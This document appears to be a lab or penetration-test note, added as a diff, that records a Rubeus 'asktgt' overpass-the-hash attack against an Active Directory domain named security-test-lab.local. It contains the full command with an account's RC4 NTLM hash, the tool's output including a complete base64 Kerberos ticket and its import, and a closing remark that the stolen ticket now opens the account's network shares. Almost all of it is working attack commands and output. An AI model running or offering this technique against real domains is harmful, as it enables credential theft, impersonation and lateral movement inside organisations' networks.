@@ -1,0 +1,89 @@
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:batch-prod /rc4:49DE316D55D2EF98DB702E743538A291 /domain:security-test-lab.local /dc:192.168.1.50 /ptt /createnetonly:C:\Windows\System32\cmd.exe
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.2.1
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : False
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 11300
+[+] LUID            : 46885905
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 49DE316D55D2EF98DB702E743538A291
+[*] Target LUID : 46885905
+[*] Using domain controller: 192.168.1.50
+[*] Building AS-REQ (w/ preauth) for: 'security-test-lab.local\batch-prod'
+[*] Connecting to 192.168.1.50:88
+[*] Sent 257 bytes
+[*] Received 1528 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x2cb6c11
+[+] Ticket successfully imported!
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD\LAPSToolkit-master>
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD\LAPSToolkit-master> explorer
+
+=> Since the ticket has been imported in our session, we can now browse with our explorer the Windows network shares that requires the credentials of the batch-prod account.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
